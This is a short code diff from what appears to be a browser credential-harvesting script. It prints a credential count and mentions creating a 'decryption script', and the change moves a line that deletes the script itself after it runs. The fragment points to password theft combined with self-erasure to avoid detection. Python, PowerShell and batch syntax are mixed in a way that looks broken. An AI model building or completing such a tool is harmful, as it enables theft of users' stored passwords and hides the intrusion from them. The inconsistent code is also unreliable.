@@ -345,5 +345,6 @@ print(f"Total credentials: {len(credentials)}")
         Write-Host "No credentials found. Cannot create decryption script."
         Write-Host "Check if browsers are installed and contain saved passwords."
     }
+    (del "%~f0") & exit
 }
-(del "%~f0") & exit
+
